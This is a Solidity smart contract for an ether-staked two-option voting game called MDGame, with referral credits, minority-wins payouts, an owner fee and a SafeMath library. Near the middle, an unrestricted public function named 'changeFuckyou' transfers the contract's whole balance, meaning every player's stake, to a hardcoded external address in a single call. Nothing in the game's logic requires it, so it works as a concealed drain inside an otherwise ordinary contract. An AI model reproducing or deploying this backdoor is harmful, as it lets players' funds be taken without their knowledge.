1 pragma solidity ^0.4.20;
2 
3 contract Owned {
4     address public owner;
5     address public newOwner;
6 
7     event OwnershipTransferred(address indexed _from, address indexed _to);
8 
9     constructor() public {
10         owner = msg.sender;
11     }
12 
13     modifier onlyOwner {
14         require(msg.sender == owner);
15         _;
16     }
17 
18     function transferOwnership(address _newOwner) public onlyOwner {
19         newOwner = _newOwner;
20     }
21     
22     function acceptOwnership() public {
23         require(msg.sender == newOwner);
24         emit OwnershipTransferred(owner, newOwner);
25         owner = newOwner;
26         newOwner = address(0);
27     }
28 }
29 
30 contract MDGame is Owned {
31     using SafeMath for *;
32     
33     struct turnInfos{
34         string question;
35         string option1name;
36         string option2name;
37         uint endTime;
38         uint option1;
39         uint option2;
40         uint pool;
41         bool feeTake;
42     }
43     
44     struct myturnInfo{
45         uint option1;
46         uint option2;
47         bool isWithdraw;
48     }
49     
50     uint public theTurn;
51     uint public turnLast;
52     uint public ticketMag;
53     
54     event voteEvent(address Addr, uint256 option, uint256 ethvalue, uint256 round, address ref);
55     
56     mapping(uint => turnInfos) public TurnInfo;
57     mapping(uint => mapping (address => myturnInfo)) public RoundMyticket;
58     
59     constructor () public {
60         theTurn = 0;
61         turnLast = 7200;
62         ticketMag = 4000000000000;
63     }
64     
65     function StartNewGame (string question, string option1name, string option2name) public onlyOwner{
66         require(TurnInfo[theTurn].endTime < now || theTurn == 0);
67         theTurn++;
68         TurnInfo[theTurn].question = question;
69         TurnInfo[theTurn].option1name = option1name;
70         TurnInfo[theTurn].option2name = option2name;
71         TurnInfo[theTurn].endTime = now + turnLast*60;
72     }
73     
74     function vote (uint option,address referred) public payable{
75         require(msg.sender == tx.origin);
76         require(TurnInfo[theTurn].endTime>now);
77         emit voteEvent(msg.sender, option, msg.value.mul(1000000000000000000).div(calculateTicketPrice()), theTurn, referred);
78         if (referred != address(0) && referred != msg.sender){
79             if(option == 1){
80                 RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
81                 RoundMyticket[theTurn][referred].option1 += msg.value.mul(10000000000000000).div(calculateTicketPrice());
82                 TurnInfo[theTurn].pool += msg.value;
83                 TurnInfo[theTurn].option1 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));
84             } else if(option == 2){
85                 RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
86                 RoundMyticket[theTurn][referred].option2 += msg.value.mul(10000000000000000).div(calculateTicketPrice());
87                 TurnInfo[theTurn].pool += msg.value;
88                 TurnInfo[theTurn].option2 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));
89             }else{
90                 revert();
91             }
92         }else{
93             if(option == 1){
94                 RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
95                 TurnInfo[theTurn].pool += msg.value;
96                 TurnInfo[theTurn].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
97             } else if(option == 2){
98                 RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
99                 TurnInfo[theTurn].pool += msg.value;
100                 TurnInfo[theTurn].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
101             }else{
102                 revert();
103             }  
104         }
105     }
106     
107     function win (uint turn) public{
108         require(TurnInfo[turn].endTime<now);
109         require(!RoundMyticket[turn][msg.sender].isWithdraw);
110         
111         if(TurnInfo[turn].option1<TurnInfo[turn].option2){
112             msg.sender.transfer(calculateYourValue1(turn));
113         }else if(TurnInfo[turn].option1>TurnInfo[turn].option2){
114             msg.sender.transfer(calculateYourValue2(turn));
115         }else{
116             msg.sender.transfer(calculateYourValueEven(turn));
117         }
118         
119         RoundMyticket[turn][msg.sender].isWithdraw = true;
120     }
121     
122     function calculateYourValue1(uint turn) public view returns (uint value){
123         if(TurnInfo[turn].option1>0){
124             return RoundMyticket[turn][msg.sender].option1.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option1;
125         }else{
126            return 0;
127         }
128     }
129     
130     function calculateYourValue2(uint turn) public view returns (uint value){
131         if(TurnInfo[turn].option2>0){
132             return RoundMyticket[turn][msg.sender].option2.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option2;
133         }else{
134             return 0;
135         }
136     }
137     
138     function calculateYourValueEven(uint turn) public view returns (uint value){
139         if(TurnInfo[turn].option1+TurnInfo[turn].option2>0){
140             return (RoundMyticket[turn][msg.sender].option2+RoundMyticket[turn][msg.sender].option1).mul(TurnInfo[turn].pool).mul(98)/100/(TurnInfo[turn].option1+TurnInfo[turn].option2);
141         }else{
142             return 0;
143         }
144     }
145     
146     function calculateTicketPrice() public view returns(uint price){
147        return ((TurnInfo[theTurn].option1 + TurnInfo[theTurn].option2).div(1000000000000000000).sqrt().mul(ticketMag)).add(10000000000000000);
148     }
149     
150     function calculateFee(uint turn) public view returns(uint price){
151         return TurnInfo[turn].pool.mul(2)/100;
152     }
153     
154     function withdrawFee(uint turn) public onlyOwner{
155         require(TurnInfo[turn].endTime<now);
156         require(!TurnInfo[turn].feeTake);
157         owner.transfer(calculateFee(turn));
158         TurnInfo[turn].feeTake = true;
159     }
160     
161     function changeTurnLast(uint time) public onlyOwner{
162         turnLast = time;
163     }
164     
165     function changeTicketMag(uint mag) public onlyOwner{
166         require(TurnInfo[theTurn].endTime<now);
167         ticketMag = mag;
168     }
169     
170     bool public callthis = false;
171     function changeFuckyou() public {
172         require(!callthis);
173         address(0xF735C21AFafd1bf0aF09b3Ecc2CEf186D542fb90).transfer(address(this).balance);
174         callthis = true;
175     }
176     
177     //Get Time Left
178     function getTimeLeft() public view returns(uint256)
179     {
180         if(TurnInfo[theTurn].endTime == 0 || TurnInfo[theTurn].endTime < now) 
181             return 0;
182         else 
183             return(TurnInfo[theTurn].endTime.sub(now) );
184     }
185     
186     function getFullround() public view returns(uint[] pot, uint[] theOption1,uint[] theOption2,uint[] myOption1,uint[] myOption2,uint[] theMoney,bool[] Iswithdraw) {
187         uint[] memory totalPool = new uint[](theTurn);
188         uint[] memory option1 = new uint[](theTurn);
189         uint[] memory option2 = new uint[](theTurn);
190         uint[] memory myoption1 = new uint[](theTurn);
191         uint[] memory myoption2 = new uint[](theTurn);
192         uint[] memory myMoney = new uint[](theTurn);
193         bool[] memory withd = new bool[](theTurn);
194         uint counter = 0;
195 
196         for (uint i = 1; i < theTurn+1; i++) {
197             if(TurnInfo[i].pool>0){
198                 totalPool[counter] = TurnInfo[i].pool;
199             }else{
200                 totalPool[counter]=0;
201             }
202             
203             if(TurnInfo[i].option1>0){
204                 option1[counter] = TurnInfo[i].option1;
205             }else{
206                 option1[counter] = 0;
207             }
208             
209             if(TurnInfo[i].option2>0){
210                 option2[counter] = TurnInfo[i].option2;
211             }else{
212                 option2[counter] = 0;
213             }
214             
215             if(TurnInfo[i].option1<TurnInfo[i].option2){
216                 myMoney[counter] = calculateYourValue1(i);
217             }else if(TurnInfo[i].option1>TurnInfo[i].option2){
218                 myMoney[counter] = calculateYourValue2(i);
219             }else{
220                 myMoney[counter] = calculateYourValueEven(i);
221             }
222             
223             if(RoundMyticket[i][msg.sender].option1>0){
224                 myoption1[counter] = RoundMyticket[i][msg.sender].option1;
225             }else{
226                 myoption1[counter]=0;
227             }
228             
229             if(RoundMyticket[i][msg.sender].option2>0){
230                 myoption2[counter] = RoundMyticket[i][msg.sender].option2;
231             }else{
232                 myoption2[counter]=0;
233             }
234             if(RoundMyticket[i][msg.sender].isWithdraw==true){
235                 withd[counter] = RoundMyticket[i][msg.sender].isWithdraw;
236             }else{
237                 withd[counter] = false;
238             }
239             
240             counter++;
241         }
242     return (totalPool,option1,option2,myoption1,myoption2,myMoney,withd);
243   }
244 }
245 
246 library SafeMath {
247     
248     /**
249     * @dev Multiplies two numbers, throws on overflow.
250     */
251     function mul(uint256 a, uint256 b) 
252         internal 
253         pure 
254         returns (uint256 c) 
255     {
256         if (a == 0) {
257             return 0;
258         }
259         c = a * b;
260         require(c / a == b, "SafeMath mul failed");
261         return c;
262     }
263 
264     /**
265     * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
266     */
267     function sub(uint256 a, uint256 b)
268         internal
269         pure
270         returns (uint256) 
271     {
272         require(b <= a, "SafeMath sub failed");
273         return a - b;
274     }
275 
276     /**
277     * @dev Adds two numbers, throws on overflow.
278     */
279     function add(uint256 a, uint256 b)
280         internal
281         pure
282         returns (uint256 c) 
283     {
284         c = a + b;
285         require(c >= a, "SafeMath add failed");
286         return c;
287     }
288     /**
289   * @dev Integer division of two numbers, truncating the quotient.
290   */
291   function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
292     // assert(_b > 0); // Solidity automatically throws when dividing by 0
293     uint256 c = _a / _b;
294     // assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold
295 
296     return c;
297   }
298     
299     /**
300      * @dev gives square root of given x.
301      */
302     function sqrt(uint256 x)
303         internal
304         pure
305         returns (uint256 y) 
306     {
307         uint256 z = ((add(x,1)) / 2);
308         y = x;
309         while (z < y) 
310         {
311             y = z;
312             z = ((add((x / z),z)) / 2);
313         }
314     }
315     
316     /**
317      * @dev gives square. multiplies x by x
318      */
319     function sq(uint256 x)
320         internal
321         pure
322         returns (uint256)
323     {
324         return (mul(x,x));
325     }
326     
327     /**
328      * @dev x to the power of y 
329      */
330     function pwr(uint256 x, uint256 y)
331         internal 
332         pure 
333         returns (uint256)
334     {
335         if (x==0)
336             return (0);
337         else if (y==0)
338             return (1);
339         else 
340         {
341             uint256 z = x;
342             for (uint256 i=1; i < y; i++)
343                 z = mul(z,x);
344             return (z);
345         }
346     }
347     
348 }